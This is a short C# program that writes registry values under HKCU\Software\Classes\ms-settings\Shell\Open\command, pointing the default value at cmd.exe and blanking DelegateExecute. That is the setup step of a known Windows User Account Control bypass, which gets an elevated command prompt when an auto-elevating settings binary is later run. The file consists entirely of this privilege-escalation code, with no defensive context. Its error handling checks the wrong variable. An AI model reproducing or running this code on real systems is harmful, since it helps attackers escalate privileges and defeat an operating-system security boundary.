using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;

class Program
{
    static void Main(string[] args)
    {
        string del = "";
        byte[] valueBytesdel = Encoding.ASCII.GetBytes(del);

        const string valueName = "";
        const string valueData = "cmd /c start C:\\Windows\\System32\\cmd.exe";
        byte[] valueBytes = Encoding.ASCII.GetBytes(valueData);

        // attempt to open the key
        SafeRegistryHandle hKey;
        int disposition;
        int result = RegCreateKeyEx(
            (IntPtr)HKEY_CURRENT_USER,
            @"Software\Classes\ms-settings\Shell\Open\command",
            0,
            null,
            0,
            KEY_WRITE,
            IntPtr.Zero,
            out hKey,
            out disposition);
        if (result != 0)
        {
            // handle error
        }

        // set the registry values
        int result1 = RegSetValueEx(
            hKey,
            valueName,
            0,
            RegistryValueKind.String,
            valueBytes,
            valueBytes.Length);
        if (result != 0)
        {
            // handle error
        }

        int result2 = RegSetValueEx(
            hKey,
            "DelegateExecute",
            0,
            RegistryValueKind.String,
            valueBytesdel,
            valueBytesdel.Length);
        if (result != 0)
        {
            // handle error
        }

    }

    const int HKEY_CURRENT_USER = unchecked((int)0x80000001);
    const int KEY_WRITE = 0x00020006;

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegCreateKeyEx(
    IntPtr hKey,
    string lpSubKey,
    int Reserved,
    string lpClass,
    int dwOptions,
    int samDesired,
    IntPtr lpSecurityAttributes,
    out SafeRegistryHandle phkResult,
    out int lpdwDisposition);


    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegSetValueEx(
    SafeRegistryHandle hKey,
    string lpValueName,
    int Reserved,
    RegistryValueKind dwType,
    byte[] lpData,
    int cbData);

}
